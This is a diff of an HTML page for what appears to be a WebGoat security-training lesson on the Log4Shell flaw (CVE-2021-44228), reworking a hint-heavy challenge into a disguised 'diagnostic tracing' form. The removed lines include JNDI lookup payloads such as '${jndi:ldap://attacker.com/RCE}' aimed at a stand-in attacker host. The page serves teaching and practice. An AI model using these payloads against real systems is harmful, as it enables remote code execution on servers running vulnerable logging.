@@ -1,221 +1,166 @@
 <!DOCTYPE html>
 <html xmlns:th="http://www.thymeleaf.org">
 
-    <link rel="stylesheet" type="text/css" href="http://code.jquery.com/ui/1.9.1/themes/base/jquery-ui.css" />
-    
     <!-- Main Documentation -->
     <div class="lesson-page-wrapper">
         <div class="adoc-content" th:replace="~{doc:lessons/osslog4j/documentation/VulnerableLog4jcomponents_plan.adoc}"></div>
     </div>
 
-    <!-- Original Content -->
+    <!-- Background content -->
     <div class="lesson-page-wrapper">
         <div class="adoc-content" th:replace="~{doc:lessons/osslog4j/documentation/VulnerableLog4jcomponents_content0.adoc}"></div>
     </div>
 
-    <!-- Challenge 1: Vulnerable Endpoint (CVE-2021-44228 Log4Shell) -->
+    <!-- Challenge: Diagnostic Tracing Service -->
     <div class="lesson-page-wrapper">
         <div class="challenge-header">
-            <h3>🎯 Challenge 1: Find the Log4j Weakness</h3>
-            <div class="difficulty-badge">Difficulty: ⭐⭐⭐</div>
+            <h3>Challenge: Investigate the Diagnostic Tracing Service</h3>
+            <div class="difficulty-badge">Difficulty: &#9733;&#9733;&#9733;</div>
             <p class="challenge-description">
-                <strong>Scenario:</strong> A developer integrated a logging library to monitor API requests. 
-                The system logs incoming request headers for debugging purposes. Your task is to discover 
-                if the logging mechanism has any unintended side effects when processing special input patterns.
+                <strong>Scenario:</strong> A monitoring service accepts structured trace events from
+                distributed clients. Each event carries a severity level, originating region, and a
+                free-form <em>Request Tag</em> used for cross-service correlation. The service writes
+                these fields into its audit log using the application's shared logging pipeline.
             </p>
-            <div class="challenge-objective">
-                <p><strong>Objective:</strong> Craft a special HTTP request that demonstrates how the logging system 
-                processes certain message interpolation patterns. Pay attention to <strong>both request headers AND parameters</strong>!</p>
-            </div>
+            <p>
+                Explore how the logging pipeline processes the <strong>Request Tag</strong> field.
+                Consider what happens when this value contains special syntax that the logger
+                might interpret rather than treat as opaque text.
+            </p>
         </div>
 
         <div class="attack-container">
             <div class="assignment-success">
                 <i class="fa fa-2 fa-check hidden" aria-hidden="true"></i>
-                <span class="success-message">Challenge Completed!</span>
             </div>
 
-            <div class="challenge-context">
-                <p><strong>Key Insight:</strong> The API endpoint logs both custom HTTP headers and request parameters. 
-                What if you could inject special directives into the HTTP request headers? 
-                Can you make the logging system process something beyond plain text?</p>
-                
-                <div class="request-hint-box">
-                    <p><strong>💡 Request Structure Hint:</strong></p>
-                    <pre class="http-example">
-POST /VulnerableLog4jComponentsLesson/index HTTP/1.1
-Host: localhost:8080
-<span class="highlight">X-Api-Version: [YOUR SPECIAL INPUT HERE]</span>
-Content-Type: application/x-www-form-urlencoded
+            <!-- Diagnostic Trace Form -->
+            <form class="attack-form" accept-charset="UTF-8" id="diagnosticTraceForm"
+                  method="POST"
+                  action="api/diagnostics/trace"
+                  successCallback="">
 
-<span class="highlight">payload=[OPTIONAL PAYLOAD HERE]</span>
-                    </pre>
-                </div>
-            </div>
+                <h4>Submit Diagnostic Trace Event</h4>
 
-            <form class="attack-form" accept-charset="UTF-8" method="POST" th:action="@{/VulnerableLog4jComponentsLesson/index}">
-                
-                <div id="lessonContent">
-                    <div class="input-section">
-                        <h4>🔍 Craft Your Request:</h4>
-                        
-                        <p class="hint-text">💡 <em>Hints to explore:</em></p>
-                        <ul class="hint-list">
-                            <li><strong>HTTP Headers Matter:</strong> Some headers are logged by the application</li>
-                            <li><strong>Special Syntax:</strong> What if text contained syntax like <code>${...}</code>?</li>
-                            <li><strong>External Connections:</strong> Could it reach out to external services? (Think JNDI...)</li>
-                            <li><strong>Protocol Schemes:</strong> What about combining protocols like <code>ldap://</code>?</li>
-                            <li><strong>The X-Api-Version Header:</strong> This header is explicitly logged by the application</li>
-                        </ul>
-
-                        <table class="input-table">
-                            <!-- X-Api-Version Header Input (sent as parameter) -->
-                            <tr class="header-input-row">
-                                <td class="label">
-                                    <strong>HTTP Header:</strong><br/>
-                                    <code>X-Api-Version</code>
-                                </td>
-                                <td class="input-field">
-                                    <textarea 
-                                        id="apiVersionHeader" 
-                                        name="apiVersionHeader" 
-                                        rows="4" 
-                                        cols="75" 
-                                        placeholder="Try: ${jndi:ldap://localhost:9000/Exploit}&#10;or: jndi:ldap://attacker.com/RCE&#10;or any pattern with LDAP protocol..."
-                                    ></textarea>
-                                    <small class="field-hint">This value will be sent as <code>X-Api-Version</code> request header</small>
-                                </td>
-                            </tr>
-
-                            <!-- Payload Parameter Input -->
-                            <tr class="parameter-input-row">
-                                <td class="label">
-                                    <strong>Request Parameter:</strong><br/>
-                                    <code>payload</code>
-                                </td>
-                                <td class="input-field">
-                                    <textarea 
-                                        id="payload" 
-                                        name="payload" 
-                                        rows="4" 
-                                        cols="75" 
-                                        placeholder="Optional: You can also test patterns here"
-                                    ></textarea>
-                                    <small class="field-hint">This value will be sent as POST parameter</small>
-                                </td>
-                            </tr>
-
-                            <!-- Submit Button -->
-                            <tr class="submit-row">
-                                <td colspan="2" class="button-cell">
-                                    <input 
-                                        name="SUBMIT" 
-                                        value="📤 Send Request" 
-                                        type="SUBMIT" 
-                                        class="submit-btn"
-                                    />
-                                    <span class="submit-hint">Clicking will send HTTP request with your inputs</span>
-                                </td>
-                            </tr>
-                        </table>
-
-                        <div class="info-box">
-                            <p><strong>ℹ️ What to Look For:</strong></p>
-                            <ul>
-                                <li>✓ Message interpolation syntax (${...})</li>
-                                <li>✓ Java Naming and Directory Interface (JNDI) patterns</li>
-                                <li>✓ Directory service protocols (ldap://, rmi://, dns://)</li>
-                                <li>✓ Remote class loading capabilities</li>
-                            </ul>
-                        </div>
-
-                        <div class="warning-box">
-                            <p><strong>⚠️ Real-World Context:</strong></p>
-                            <p>In CVE-2021-44228, the vulnerability exists because Log4j automatically processes 
-                            special lookup syntax in ANY user-supplied data that gets logged—whether it comes from 
-                            parameters, headers, cookies, or any other input source. By injecting patterns into 
-                            HTTP request headers, you can trigger JNDI lookups that the logging library will execute.</p>
-                        </div>
-                    </div>
-                </div>
+                <table class="input-table" style="border-collapse:separate; border-spacing:0 8px;">
+                    <tr>
+                        <td style="width:160px; vertical-align:top; padding-right:12px;">
+                            <label for="traceLevelField">Severity Level</label>
+                        </td>
+                        <td>
+                            <select id="traceLevelField" name="traceLevel" style="width:120px;">
+                                <option value="INFO" selected>INFO</option>
+                                <option value="WARN">WARN</option>
+                                <option value="DEBUG">DEBUG</option>
+                                <option value="TRACE">TRACE</option>
+                            </select>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="vertical-align:top; padding-right:12px;">
+                            <label for="serviceRegionField">Service Region</label>
+                        </td>
+                        <td>
+                            <input id="serviceRegionField" name="serviceRegion" type="text"
+                                   value="us-east-1" style="width:140px;" />
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="vertical-align:top; padding-right:12px;">
+                            <label for="correlationIdField">Correlation ID</label><br/>
+                            <small style="color:#888;">(auto-generated)</small>
+                        </td>
+                        <td>
+                            <input id="correlationIdField" name="correlationId" type="text"
+                                   readonly style="width:180px; color:#888; background:#f5f5f5;" />
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="vertical-align:top; padding-right:12px;">
+                            <label for="requestTagField">Request Tag</label><br/>
+                            <small style="color:#888;">Forwarded to audit log</small>
+                        </td>
+                        <td>
+                            <textarea id="requestTagField" name="requestTag"
+                                      rows="5" cols="60"
+                                      placeholder="Enter a correlation tag for this trace event"></textarea>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td colspan="2" style="padding-top:8px;">
+                            <input name="SUBMIT" value="Submit Trace Event" type="submit"
+                                   class="btn btn-primary"/>
+                        </td>
+                    </tr>
+                </table>
             </form>
 
-            <!-- Display feedback from server -->
-            <div class="results-section" th:if="${feedback != null}">
-                <div class="attack-feedback" th:if="${feedback != null}">
-                    <p><strong>Feedback:</strong> <span th:text="${feedback}">No feedback</span></p>
-                </div>
-                <div class="attack-output" th:if="${output != null}">
-                    <p><strong>Output:</strong> <span th:text="${output}">No output</span></p>
-                </div>
-            </div>
-
-            <div class="progress-indicator">
-                <p><strong>Status:</strong> <span class="status-text">Ready for input...</span></p>
-            </div>
+            <div class="attack-feedback"></div>
+            <div class="attack-output" style="font-family:monospace; white-space:pre-wrap;"></div>
         </div>
     </div>
 
-    <!-- Challenge Content -->
+    <!-- Reference content -->
     <div class="lesson-page-wrapper">
         <div class="adoc-content" th:replace="~{doc:lessons/osslog4j/documentation/VulnerableLog4jcomponents_content1.adoc}"></div>
     </div>
 
-    <!-- Additional Resources -->
-    <div class="lesson-page-wrapper">
-        <div class="resources-section">
-            <h4>🔍 Investigation Resources</h4>
-            <ul class="resources-list">
-                <li><a href="#" target="_blank">Understanding HTTP Request Headers</a></li>
-                <li><a href="#" target="_blank">Message Interpolation in Log4j</a></li>
-                <li><a href="#" target="_blank">JNDI Injection Fundamentals</a></li>
-                <li><a href="#" target="_blank">How LDAP Directory Services Work</a></li>
-            </ul>
-        </div>
-    </div>
-
-           <!-- Original Content 1 -->
-    <div class="lesson-page-wrapper">
-        <div class="adoc-content" th:replace="~{doc:lessons/osslog4j/documentation/VulnerableLog4jcomponents_content1.adoc}"></div>
-    </div>
-    
-       <!-- Minimal JavaScript: Only to add custom header -->
     <script>
-    document.getElementById('log4jForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const apiVersionValue = document.getElementById('apiVersion').value;
-        const payloadValue = document.getElementById('payload').value;
-        
-        const formData = new URLSearchParams();
-        formData.append('payload', payloadValue || '');
-        
-        // Send with custom X-Api-Version header
-        fetch(this.action, {
-            method: 'POST',
-            body: formData,
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'X-Api-Version': apiVersionValue || ''
-            }
-        })
-        .then(response => response.json())
-        .then(data => {
-            const feedbackEl = document.querySelector('.attack-feedback');
-            const outputEl = document.querySelector('.attack-output');
-            const statusEl = document.querySelector('.status-text');
-            
-            feedbackEl.innerHTML = '<p><strong>Feedback:</strong> ' + (data.feedback || 'No feedback') + '</p>';
-            outputEl.innerHTML = '<p><strong>Output:</strong> ' + (data.output || 'No output') + '</p>';
-            statusEl.textContent = data.success ? '✅ Exploit Successful!' : '❌ Attempt Failed';
-            
-            if (data.success) {
-                document.querySelector('.assignment-success').classList.remove('hidden');
-            }
-        })
-        .catch(error => {
-            document.querySelector('.attack-feedback').innerHTML = '<p style="color: red;">Error: ' + error.message + '</p>';
-        });
-    });
+    (function () {
+        // Auto-populate the correlation ID field on load
+        var corrField = document.getElementById('correlationIdField');
+        if (corrField) {
+            corrField.value = 'COR-' + Math.random().toString(36).substr(2, 8).toUpperCase();
+        }
+
+        // Override submit to send requestTag as both POST body AND X-Api-Version header
+        var form = document.getElementById('diagnosticTraceForm');
+        if (form) {
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+
+                var requestTagValue   = document.getElementById('requestTagField').value   || '';
+                var traceLevelValue   = document.getElementById('traceLevelField').value   || 'INFO';
+                var serviceRegionValue= document.getElementById('serviceRegionField').value|| 'us-east-1';
+                var correlationIdValue= document.getElementById('correlationIdField').value|| '';
+
+                var formData = new URLSearchParams();
+                formData.append('traceLevel',     traceLevelValue);
+                formData.append('serviceRegion',  serviceRegionValue);
+                formData.append('correlationId',  correlationIdValue);
+                formData.append('requestTag',     requestTagValue);
+
+                // Determine base path for this WebGoat instance
+                var basePath = window.location.pathname.replace(/\/[^\/]*$/, '') + '/';
+
+                fetch(basePath + 'api/diagnostics/trace', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-Api-Version': requestTagValue
+                    }
+                })
+                .then(function (r) { return r.json(); })
+                .then(function (data) {
+                    var fb  = form.parentElement.querySelector('.attack-feedback');
+                    var out = form.parentElement.querySelector('.attack-output');
+                    if (fb)  fb.innerHTML  = data.feedback || '';
+                    if (out) out.innerHTML = data.output   || '';
+
+                    if (data.lessonCompleted || data.success) {
+                        var check = form.closest('.attack-container').querySelector('.assignment-success i');
+                        if (check) check.classList.remove('hidden');
+                    }
+                })
+                .catch(function (err) {
+                    var fb = form.parentElement.querySelector('.attack-feedback');
+                    if (fb) fb.innerHTML = 'Request error: ' + err.message;
+                });
+            }, true); // capture phase so we run before goatApp
+        }
+    }());
     </script>
+
 </html>
